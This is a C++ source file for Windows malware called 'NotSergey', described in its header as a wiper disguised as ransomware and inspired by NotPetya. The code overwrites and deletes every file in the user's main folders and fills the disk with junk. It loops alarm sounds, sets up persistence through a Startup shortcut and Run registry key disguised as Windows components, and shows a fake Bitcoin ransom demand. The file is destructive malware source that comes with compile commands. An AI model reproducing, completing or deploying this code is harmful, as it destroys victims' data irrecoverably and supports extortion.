// NotSergey.cpp - Wiper disguised as ransomware, inspired by NotPetya
// Compile: cl NotSergey.cpp /EHsc /link user32.lib gdi32.lib winmm.lib ole32.lib advapi32.lib shell32.lib
// or g++ NotSergey.cpp -o NotSergey.exe -luser32 -lgdi32 -lwinmm -lole32 -ladvapi32 -lshell32 -mwindows -std=c++17 



//=========================================
// Not Sergey - By Ethan Sharma - Wadeson
//=========================================

#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <wininet.h>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <random>
#include <filesystem>
#include <chrono>
#include <algorithm>
#include <cwchar>
#include <tlhelp32.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

namespace fs = std::filesystem;

std::atomic<bool> g_running{true};
std::atomic<bool> g_paid{false};
std::string g_btc = "bc1qxyzabcde12345fghij"; // Fake BTC

const KNOWNFOLDERID folders[] = {
    FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Downloads,
    FOLDERID_Pictures, FOLDERID_Music, FOLDERID_Videos,
    FOLDERID_LocalAppData, FOLDERID_RoamingAppData
};

void WipeFile(const fs::path& p) {
    try {
        // Corrupt file
        HANDLE h = CreateFileW(p.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            char junk[4096];
            std::fill(std::begin(junk), std::end(junk), (char)rand());
            DWORD written;
            WriteFile(h, junk, sizeof(junk), &written, NULL);
            CloseHandle(h);
        }
        fs::remove(p);
    } catch (...) {}
}

void WipeDirectory(const fs::path& dir) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(dir, fs::directory_options::skip_permission_denied)) {
            if (!g_running) break;
            if (entry.is_regular_file()) WipeFile(entry.path());
        }
    } catch (...) {}
}

void DiskFiller() {
    wchar_t path[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
    fs::path base = fs::path(path) / L"NotSergeyJunk";
    fs::create_directories(base);

    std::vector<char> junk(1024 * 1024, 'X');
    int count = 0;
    while (g_running) {
        try {
            fs::path file = base / (L"junk" + std::to_wstring(count++) + L".bin");
            std::ofstream f(file, std::ios::binary);
            for (int i = 0; i < 50; ++i) f.write(junk.data(), junk.size());
        } catch (...) {}
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

void AudioTerror() {
    while (g_running) {
        PlaySoundW(L"SystemHand", NULL, SND_ALIAS | SND_ASYNC);
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
}

void Persistence() {
    wchar_t startup[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startup);
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    wchar_t link[MAX_PATH];
    PathCombineW(link, startup, L"WindowsUpdate.lnk");

    CoInitialize(NULL);
    IShellLinkW* sl;
    CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&sl);
    sl->SetPath(self);
    IPersistFile* pf;
    sl->QueryInterface(IID_IPersistFile, (LPVOID*)&pf);
    pf->Save(link, TRUE);
    pf->Release();
    sl->Release();
    CoUninitialize();

    HKEY key;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key);
    RegSetValueExW(key, L"WindowsService", 0, REG_SZ, (BYTE*)self, (wcslen(self) + 1) * sizeof(wchar_t));
    RegCloseKey(key);
}

bool CheckPayment() {
    // Fake poll – always false
    return false;
}

LRESULT CALLBACK GuiProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l) {
    static HWND status;
    switch (msg) {
    case WM_CREATE:
        CreateWindowW(L"STATIC", L"NotSergey Ransomware", WS_VISIBLE | WS_CHILD, 10, 10, 380, 30, hwnd, NULL, NULL, NULL);
        CreateWindowW(L"STATIC", L"Your files are encrypted. Pay 0.1 BTC to:", WS_VISIBLE | WS_CHILD, 10, 50, 380, 30, hwnd, NULL, NULL, NULL);
        CreateWindowW(L"EDIT", g_btc.c_str(), WS_VISIBLE | WS_CHILD | WS_BORDER | ES_READONLY, 10, 90, 380, 30, hwnd, NULL, NULL, NULL);
        status = CreateWindowW(L"STATIC", L"Waiting for payment...", WS_VISIBLE | WS_CHILD, 10, 130, 380, 30, hwnd, NULL, NULL, NULL);
        SetTimer(hwnd, 1, 5000, NULL);
        break;
    case WM_TIMER:
        if (CheckPayment()) {
            g_paid = true;
            SetWindowTextW(status, L"Payment received – but no decryption! Haha!");
            // Continue wiping
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcW(hwnd, msg, w, l);
    }
    return 0;
}

void GuiThread() {
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = GuiProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"NotSergeyGUI";
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowW(L"NotSergeyGUI", L"NotSergey", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 200, NULL, NULL, wc.hInstance, NULL);
    ShowWindow(hwnd, SW_SHOW);
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
}

void FakeBSOD() {
    // Simple full-screen black with text – expand for more effects
    MessageBoxW(NULL, L"System Destroyed – No Recovery", L"NotSergey", MB_ICONERROR);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, LPWSTR, int) {
    Persistence();
    std::thread gui(GuiThread);
    std::thread audio(AudioTerror);
    std::thread filler(DiskFiller);
    FakeBSOD();

    for (const auto& fid : folders) {
        PWSTR path = NULL;
        if (SUCCEEDED(SHGetKnownFolderPath(fid, 0, NULL, &path))) {
            WipeDirectory(path);
            CoTaskMemFree(path);
        }
    }

    while (g_running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    gui.join();
    audio.join();
    filler.join();
    return 0;
}
